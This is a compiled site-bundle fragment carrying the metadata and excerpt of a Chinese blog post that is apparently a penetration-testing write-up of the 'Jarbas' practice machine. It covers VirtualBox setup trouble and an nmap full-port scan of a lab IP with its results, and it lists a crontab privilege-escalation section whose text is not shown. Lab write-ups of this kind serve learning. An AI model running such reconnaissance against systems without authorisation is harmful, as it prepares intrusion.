r=i(h,[["render",t],["__file","Jarbas.html.vue"]]),d=JSON.parse('{"path":"/article/01_%E9%A1%B9%E7%9B%AE/%E6%B8%97%E9%80%8F/Jarbas.html","title":"Jarbas","lang":"zh-CN","frontmatter":{"icon":"pen-to-square","date":"2025-07-14T00:00:00.000Z","tags":null,"title":"Jarbas","category":["项目"],"description":"前言 可恶的virtualbox靶场，让我踩了一堆坑 virtualbox必须关闭Hyper-V，让我直接没办法用wsl-kali,因此还去特意下了一个kali，最开始想试一下hyper-V版本，但是根本没法运行bat，果断放弃换用VMware，少折腾，放心。 virtualbox的NAT不会产生虚拟网卡，而是在主机创建一个virtualbox路由，让...","head":[["meta",{"property":"og:url","content":"https://github.com/fakeppa/fakeppa.github.io/article/01_%E9%A1%B9%E7%9B%AE/%E6%B8%97%E9%80%8F/Jarbas.html"}],["meta",{"property":"og:site_name","content":"问己"}],["meta",{"property":"og:title","content":"Jarbas"}],["meta",{"property":"og:description","content":"前言 可恶的virtualbox靶场，让我踩了一堆坑 virtualbox必须关闭Hyper-V，让我直接没办法用wsl-kali,因此还去特意下了一个kali，最开始想试一下hyper-V版本，但是根本没法运行bat，果断放弃换用VMware，少折腾，放心。 virtualbox的NAT不会产生虚拟网卡，而是在主机创建一个virtualbox路由，让..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250714023553.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-08-25T13:49:03.000Z"}],["meta",{"property":"article:published_time","content":"2025-07-14T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-08-25T13:49:03.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Jarbas\\",\\"image\\":[\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250714023553.png\\",\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250715082826.png\\"],\\"datePublished\\":\\"2025-07-14T00:00:00.000Z\\",\\"dateModified\\":\\"2025-08-25T13:49:03.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"fakeppa\\",\\"url\\":\\"https://github.com/fakeppa/fakeppa.github.io\\"}]}"]]},"headers":[{"level":2,"title":"前言","slug":"前言","link":"#前言","children":[]},{"level":2,"title":"信息收集","slug":"信息收集","link":"#信息收集","children":[{"level":3,"title":"详细信息扫描","slug":"详细信息扫描","link":"#详细信息扫描","children":[]}]},{"level":2,"title":"渗透过程","slug":"渗透过程","link":"#渗透过程","children":[{"level":3,"title":"Crontab定时任务提权","slug":"crontab定时任务提权","link":"#crontab定时任务提权","children":[]}]},{"level":2,"title":"总结","slug":"总结","link":"#总结","children":[]}],"git":{"createdTime":1752429313000,"updatedTime":1756129743000,"contributors":[{"name":"fakeppa","username":"fakeppa","email":"l17091799155@qq.com","commits":121,"url":"https://github.com/fakeppa"}]},"readingTime":{"minutes":2.9,"words":871},"filePathRelative":"article/01_项目/渗透/Jarbas.md","localizedDate":"2025年7月14日","excerpt":"<h2>前言</h2>\\n<p>可恶的virtualbox靶场，让我踩了一堆坑</p>\\n<ol>\\n<li>virtualbox必须关闭Hyper-V，让我直接没办法用wsl-kali,因此还去特意下了一个kali，最开始想试一下hyper-V版本，但是根本没法运行bat，果断放弃换用VMware，少折腾，放心。</li>\\n<li>virtualbox的NAT不会产生虚拟网卡，而是在主机创建一个virtualbox路由，让我没办法直连虚拟机，后来换用仅主机模式才直连上</li>\\n</ol>\\n<h2>信息收集</h2>\\n<div class=\\"language-bash line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"bash\\" data-title=\\"bash\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">┌──(kali㉿kali</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">)-[~]</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">└─$</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> sudo</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> nmap</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -sT</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> --min-rate</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> 10000</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -p-</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> 192.168.56.102</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -oA</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> nmapscan/ports</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> </span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">[sudo] password </span><span style=\\"--shiki-light:#A626A4;--shiki-dark:#C678DD\\">for</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> kali: </span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">Starting</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> Nmap</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> 7.95</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> ( </span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">https://nmap.org</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> ) at 2025-07-13 13:34 EDT</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">Nmap</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> scan</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> report</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> for</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> 192.168.56.102</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">Host</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> is</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> up</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> (0.025s </span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">latency</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">).</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">Not</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> shown:</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> 65530</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> filtered</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> tcp</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> ports</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> (no-response)</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">PORT</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">     STATE</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> SERVICE</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">22/tcp</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">   open</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">  ssh</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">25/tcp</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">   open</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">  smtp</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">110/tcp</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">  open</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">  pop3</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">3306/tcp</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> open</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">  mysql</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">8080/tcp</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> open</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">  http-proxy</span></span>\\n<span class=\\"line\\"></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">Nmap</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> done:</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> 1</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> IP</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> address</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> (1 </span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\">host</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> up</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\">) scanned in 18.85 seconds</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div>","autoDesc":true}');export{r as comp,d as data};
